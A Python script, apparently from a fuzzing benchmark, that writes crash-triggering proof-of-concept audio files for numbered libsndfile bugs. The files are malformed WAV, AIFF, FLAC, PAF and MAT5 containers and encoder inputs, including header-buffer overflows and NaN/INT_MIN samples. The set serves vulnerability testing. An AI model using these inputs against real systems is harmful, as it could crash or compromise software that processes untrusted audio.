#!/usr/bin/env python3
"""Write one PoC per magma libsndfile bug into argv[1].

harness_0 (decoder):    SND001 002 005 006 007 016 017 020 024
harness_1 (encoder):    SND004 010 012 013 014 015 022 023 025
harness_2 (transcoder): SND010 013 014 015 022 023 (decoded data)

File names are <harness>_<bug>.<ext>. SND002 is reach-only (see harness_0.c).
"""
import os
import struct
import sys

out = sys.argv[1]
os.makedirs(out, exist_ok=True)


def w(name, data):
    with open(os.path.join(out, name), "wb") as f:
        f.write(data)


# ---------------------------------------------------------------------------
# containers

def riff(chunks, form=b"WAVE"):
    body = form + b"".join(chunks)
    return b"RIFF" + struct.pack("<I", len(body)) + body


def ck(tag, data, be=False):
    pad = b"\0" if len(data) & 1 else b""
    return tag + struct.pack(">I" if be else "<I", len(data)) + data + pad


def wav_ext(channels, mask, frames=8):
    # WAVE_FORMAT_EXTENSIBLE, 16-bit PCM, KSDATAFORMAT_SUBTYPE_PCM
    guid = struct.pack("<IHH", 1, 0, 0x10) + bytes.fromhex("800000aa00389b71")
    fmt = struct.pack("<HHIIHH", 0xFFFE, channels, 8000, 8000 * 2 * channels,
                      2 * channels, 16)
    fmt += struct.pack("<HHI", 22, 16, mask) + guid
    return riff([ck(b"fmt ", fmt), ck(b"data", b"\0" * (2 * channels * frames))])


def wav_float(samples):
    fmt = struct.pack("<HHIIHH", 3, 1, 8000, 32000, 4, 32)
    return riff([ck(b"fmt ", fmt), ck(b"fact", struct.pack("<I", len(samples))),
                 ck(b"data", struct.pack("<%df" % len(samples), *samples))])


def wav_pcm32(samples):
    fmt = struct.pack("<HHIIHH", 1, 1, 8000, 32000, 4, 32)
    return riff([ck(b"fmt ", fmt),
                 ck(b"data", struct.pack("<%di" % len(samples), *samples))])


def wav_pcm16_list(strings, frames=8):
    fmt = struct.pack("<HHIIHH", 1, 1, 8000, 16000, 2, 16)
    info = b"INFO" + b"".join(ck(t, s + b"\0") for t, s in strings)
    return riff([ck(b"fmt ", fmt), ck(b"LIST", info),
                 ck(b"data", b"\0" * (2 * frames))])


def ieee_ext(x):
    """80-bit IEEE extended, as used in the AIFF COMM sample rate."""
    import math
    m, e = math.frexp(x)
    return struct.pack(">HQ", e + 16382, int(m * (1 << 64)))


def aiff(channels, extra=b"", frames=4):
    comm = struct.pack(">hIh", channels, frames, 16) + ieee_ext(8000.0)
    ssnd = struct.pack(">II", 0, 0) + b"\0" * (2 * channels * frames)
    body = b"AIFF" + ck(b"COMM", comm, True) + extra + ck(b"SSND", ssnd, True)
    return b"FORM" + struct.pack(">I", len(body)) + body


# ---------------------------------------------------------------------------
# FLAC (hand-assembled: STREAMINFO + verbatim-subframe frames)

def crc8(data):
    c = 0
    for b in data:
        c ^= b
        for _ in range(8):
            c = ((c << 1) ^ 0x07) & 0xFF if c & 0x80 else (c << 1) & 0xFF
    return c


def crc16(data):
    c = 0
    for b in data:
        c ^= b << 8
        for _ in range(8):
            c = ((c << 1) ^ 0x8005) & 0xFFFF if c & 0x8000 else (c << 1) & 0xFFFF
    return c


BLOCK = 16


def streaminfo(rate, channels, total, last):
    v = BLOCK << 16 | BLOCK                       # min/max blocksize
    si = struct.pack(">I", v) + b"\0" * 6         # min/max framesize: unknown
    x = rate << 44 | (channels - 1) << 41 | (16 - 1) << 36 | total
    si += x.to_bytes(8, "big") + b"\0" * 16       # + MD5 (unset)
    return bytes([(0x80 if last else 0) | 0]) + len(si).to_bytes(3, "big") + si


def flac_frame(num, channels):
    hdr = bytes([0xFF, 0xF8, 0x60 | 0x0, ((channels - 1) << 4) | (0b100 << 1),
                 num, BLOCK - 1])
    hdr += bytes([crc8(hdr)])
    body = b""
    for ch in range(channels):
        body += b"\x02" + b"".join(struct.pack(">h", 100 * ch + i)
                                   for i in range(BLOCK))
    frame = hdr + body
    return frame + struct.pack(">H", crc16(frame))


def flac(infos, frame_channels):
    meta = b"".join(streaminfo(r, c, BLOCK * len(frame_channels),
                               i == len(infos) - 1)
                    for i, (r, c) in enumerate(infos))
    frames = b"".join(flac_frame(i, c) for i, c in enumerate(frame_channels))
    return b"fLaC" + meta + frames


# ---------------------------------------------------------------------------
# harness_0: decoder. The last byte selects the open mode etc.; 0x00 means
# auto-detect + sf_readf_short, which every container below tolerates.

# SND001: PAF with 0 channels ("fap " = little endian, version 0)
paf = b"fap " + struct.pack("<6i", 0, 1, 8000, 0, 0, 0)
w("h0_snd001.paf", paf + b"\0" * (2048 - len(paf)) + b"\0" * 64)

# SND002 (reach): mode 3 opens via the filesystem with an AppleDouble ._ fork.
# Consistent resource map: data [16, 16), map [16, 64).
rs = struct.pack(">IIII", 16, 16, 0, 48)
rs += b"\0" * (64 - len(rs) - 1) + b"\x03"
w("h0_snd002.sd2", rs)

# SND005: AIFF, 2 channels in COMM, CHAN layout tag "mono" (1 channel)
chan = struct.pack(">III", (100 << 16) | 1, 0, 0)
w("h0_snd005.aiff", aiff(2, ck(b"CHAN", chan, True)))

# FLAC files end in a CRC, so a 0x00 config byte is appended.
# SND006: STREAMINFO says mono, second frame is stereo
w("h0_snd006.flac", flac([(8000, 1)], [1, 2]) + b"\0")
# SND007: two STREAMINFO blocks, sample rate changes
w("h0_snd007.flac", flac([(8000, 1), (16000, 1)], [1]) + b"\0")
# SND024: two STREAMINFO blocks, channel count changes
w("h0_snd024.flac", flac([(8000, 1), (8000, 2)], [1]) + b"\0")

# SND016: MAT5 (little endian), 1x1 "samplerate" array then a double
# "wavedata" array with rows (= channels) = 2000 > SF_MAX_CHANNELS.
def mat5(rows, cols):
    hdr = b"MATLAB 5.0 MAT-file".ljust(124, b"\0") + b"\0\x01IM"
    sr = (struct.pack("<8I", 14, 64, 6, 8, 6, 0, 5, 8) + struct.pack("<3I", 1, 1, 1)
          + struct.pack("<I", 10) + b"samplerate".ljust(16, b"\0")
          + struct.pack("<HHI", 4, 2, 8000))
    data = struct.pack("<8I", 14, 96, 6, 8, 6, 0, 5, 8) + struct.pack("<2I", rows, cols)
    data += struct.pack("<2I", 1, 8) + b"wavedata" + struct.pack("<2I", 9, 8 * rows * cols)
    return hdr + sr + data + b"\0" * 64

w("h0_snd016.mat", mat5(2000, 4))

# SND017: extensible WAV, 1 channel, mask FL|FR (more bits than channels)
w("h0_snd017.wav", wav_ext(1, 0x3))
# SND020: extensible WAV, mask uses only bit 31 -> empty description string
w("h0_snd020.wav", wav_ext(1, 0x80000000))


# ---------------------------------------------------------------------------
# harness_1: encoder

MAJ = {"WAV": 0, "AIFF": 1, "AU": 2, "RAW": 3}
COD = {"PCM_16": 1, "ULAW": 7, "ALAW": 8, "DWVW_16": 20}
SHORT, INT, FLOAT, DOUBLE = 0, 1, 2, 3


def enc(major, codec, xfer=SHORT, opts=0, channels=1, rate=8000, meta=0,
        payload=b""):
    return (bytes([MAJ[major], COD[codec], opts | xfer << 2])
            + struct.pack("<H", channels - 1) + (rate - 1).to_bytes(3, "little")
            + bytes([meta]) + payload)


def strings(lst):
    return bytes([len(lst)]) + b"".join(
        bytes([t - 1]) + struct.pack("<H", len(s)) + s for t, s in lst)


def samples(fmt, vals):
    return bytes([0]) + struct.pack("<%d%s" % (len(vals), fmt), *vals)


NAN = float("nan")
INT_MIN = -2 ** 31

# SND004: RAW + DWVW_16. Silence encodes to 1 bit per sample and the encoder
# flushes its 256-byte buffer every 253 bytes, so 2012 samples + the 12-sample
# flush on close end exactly on a flush; dwvw_close then writes 0 bytes.
w("h1_snd004.bin", enc("RAW", "DWVW_16", SHORT,
                       payload=b"\xff" + b"\0" * (2 * 2012)))  # one 2012-frame chunk
# SND010: WAV + title "ab" (even strlen -> odd size -> pad byte)
w("h1_snd010.bin", enc("WAV", "PCM_16", meta=1,
                       payload=strings([(1, b"ab")]) + samples("h", [0])))
# SND012: AIFF + 400-byte title (overflows the 256-byte header buffer)
w("h1_snd012.bin", enc("AIFF", "PCM_16", meta=1,
                       payload=strings([(1, b"A" * 400)]) + samples("h", [0])))
# SND013: AIFF + cue points with long names, no instrument
cue = lambda i: struct.pack("<II", i, i) + bytes([200]) + b"C" * 200
w("h1_snd013.bin", enc("AIFF", "PCM_16", meta=4,
                       payload=bytes([3]) + cue(1) + cue(2) + cue(3)
                       + samples("h", [0])))
# SND014 / SND022: double NaN into A-law / u-law
w("h1_snd014.bin", enc("WAV", "ALAW", DOUBLE, payload=samples("d", [NAN])))
w("h1_snd022.bin", enc("WAV", "ULAW", DOUBLE, payload=samples("d", [NAN])))
# SND015 / SND023: int INT_MIN into A-law / u-law
w("h1_snd015.bin", enc("WAV", "ALAW", INT, payload=samples("i", [INT_MIN])))
w("h1_snd023.bin", enc("WAV", "ULAW", INT, payload=samples("i", [INT_MIN])))
# SND025: WAV + SF_INSTRUMENT with loop_count = 17
inst = struct.pack("<i6bxxi", 0, 60, 0, 0, 127, 0, 127, 17)
inst += b"\0" * (16 * 16)
w("h1_snd025.bin", enc("WAV", "PCM_16", meta=2,
                       payload=inst + samples("h", [0])))


# ---------------------------------------------------------------------------
# harness_2: transcoder. Trailer = opts, codec index, major index.

def tc(src, major, codec, xfer, opts=0):
    return src + bytes([opts | xfer, COD[codec], MAJ[major]])

w("h2_snd014.wav", tc(wav_float([0.5, NAN]), "WAV", "ALAW", DOUBLE))
w("h2_snd022.wav", tc(wav_float([0.5, float("inf")]), "AU", "ULAW", DOUBLE))
w("h2_snd015.wav", tc(wav_pcm32([0, INT_MIN]), "WAV", "ALAW", INT))
w("h2_snd023.wav", tc(wav_pcm32([0, INT_MIN]), "AU", "ULAW", INT))
w("h2_snd010.wav", tc(wav_pcm16_list([(b"INAM", b"ab")]), "WAV", "PCM_16", SHORT))
w("h2_snd012.wav", tc(wav_pcm16_list([(b"INAM", b"N" * 400)]), "AIFF", "PCM_16", SHORT))
